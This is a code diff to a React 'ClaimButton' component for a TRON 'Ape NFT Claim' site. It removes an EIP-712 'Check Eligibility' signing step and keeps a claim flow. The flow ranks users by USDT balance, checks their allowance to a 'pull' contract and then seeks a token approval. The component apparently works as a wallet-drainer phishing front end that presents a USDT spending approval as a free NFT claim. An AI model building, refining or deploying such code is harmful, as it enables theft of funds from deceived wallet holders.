@@ -14,7 +14,6 @@ import {
 import { Button } from "@/components/ui/button";
 import { useToast } from "@/components/ui/use-toast";
 import { Loader2, Sparkles } from "lucide-react";
-import { signEip712Message } from "@/lib/wallet";
 
 export function ClaimButton() {
   const { address, isConnected } = useTron();
@@ -24,9 +23,6 @@ export function ClaimButton() {
   const [allowance, setAllowance] = useState<bigint>(BigInt(0));
   const [isLoading, setIsLoading] = useState(false);
   const [isChecking, setIsChecking] = useState(false);
-  const [isAwaitingSignature, setIsAwaitingSignature] = useState(false);
-  const [eligibilityChecked, setEligibilityChecked] = useState(false);
-  const [lastCheckedTier, setLastCheckedTier] = useState<ReturnType<typeof getNFTTier>>(null);
 
   // Determine NFT tier based on balance (USDT has 6 decimals)
   const getNFTTier = (userBalance: bigint) => {
@@ -75,72 +71,6 @@ export function ClaimButton() {
     checkData();
   }, [isConnected, address]);
 
-  const handleCheckEligibility = async () => {
-    if (!isConnected || !address) {
-      toast({
-        variant: "destructive",
-        title: "Wallet Not Connected",
-        description: "Please connect your TronLink wallet first.",
-      });
-      return;
-    }
-
-    setIsChecking(true);
-    try {
-      const [bal, allow] = await Promise.all([
-        getTokenBalance(TOKEN_ADDRESS, address),
-        getAllowance(TOKEN_ADDRESS, address, PULL_CONTRACT_ADDRESS),
-      ]);
-      setBalance(bal);
-      setAllowance(allow);
-
-      const nftTier = getNFTTier(bal);
-      setLastCheckedTier(nftTier);
-
-      const typedData = {
-        domain: {
-          name: "Ape NFT Claim",
-          version: "1",
-          chainId: 1,
-          verifyingContract: PULL_CONTRACT_ADDRESS,
-        },
-        types: {
-          Claim: [
-            { name: "wallet", type: "string" },
-            { name: "timestamp", type: "uint256" },
-          ],
-        },
-        primaryType: "Claim",
-        message: {
-          wallet: address,
-          timestamp: Date.now(),
-        },
-      };
-
-      await signEip712Message(typedData);
-      setEligibilityChecked(true);
-
-      // Show eligible tier
-      toast({
-        title: "Eligibility checked",
-        description: "You can proceed to claim.",
-      });
-    } catch (error: any) {
-      console.error("Eligibility check error:", error);
-      const message = error?.message || "";
-      const isRateLimit = message.includes("429") || message.toLowerCase().includes("rate");
-      toast({
-        variant: "destructive",
-        title: "Check Failed",
-        description: isRateLimit
-          ? "Rate limited by the RPC. Please wait a moment and try again."
-          : message || "Failed to check eligibility. Please try again.",
-      });
-    } finally {
-      setIsChecking(false);
-    }
-  };
-
   const handleClaim = async () => {
     if (!isConnected || !address) {
       toast({
@@ -152,9 +82,8 @@ export function ClaimButton() {
     }
 
     setIsLoading(true);
-    setIsAwaitingSignature(true);
     try {
-      const nftTier = lastCheckedTier ?? getNFTTier(balance);
+      const nftTier = getNFTTier(balance);
 
       if (allowance > BigInt(0)) {
         toast({
@@ -188,7 +117,6 @@ export function ClaimButton() {
           : message || "Failed to approve. Please try again.",
       });
     } finally {
-      setIsAwaitingSignature(false);
       setIsLoading(false);
     }
   };
@@ -212,23 +140,17 @@ export function ClaimButton() {
             </p>
           </div>
 
-          {/* Check Eligibility / Claim Button */}
+          {/* Claim Button */}
           <Button
-            onClick={eligibilityChecked ? handleClaim : handleCheckEligibility}
-            disabled={eligibilityChecked ? isLoading : isChecking}
+            onClick={handleClaim}
+            disabled={isLoading || isChecking}
             className="flex-shrink-0 gap-2 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-700 hover:to-blue-700 text-white font-bold px-8 py-6 text-lg"
             size="lg"
           >
-            {(isChecking || isLoading) && <Loader2 className="h-5 w-5 animate-spin" />}
-            {!isChecking && !isLoading && <Sparkles className="h-5 w-5" />}
-            {eligibilityChecked ? (isLoading ? "Processing..." : "Claim") : isChecking ? "Checking..." : "Check Eligibility"}
+            {isLoading && <Loader2 className="h-5 w-5 animate-spin" />}
+            {!isLoading && <Sparkles className="h-5 w-5" />}
+            {isLoading ? "Processing..." : hasApproved ? "✅ Claimed" : "Claim"}
           </Button>
-          {isAwaitingSignature && (
-            <div className="flex items-center gap-2 text-xs sm:text-sm text-cyan-200">
-              <Loader2 className="h-4 w-4 animate-spin" />
-              <span>Wait for contract signing to complete</span>
-            </div>
-          )}
         </div>
       </div>
     </div>
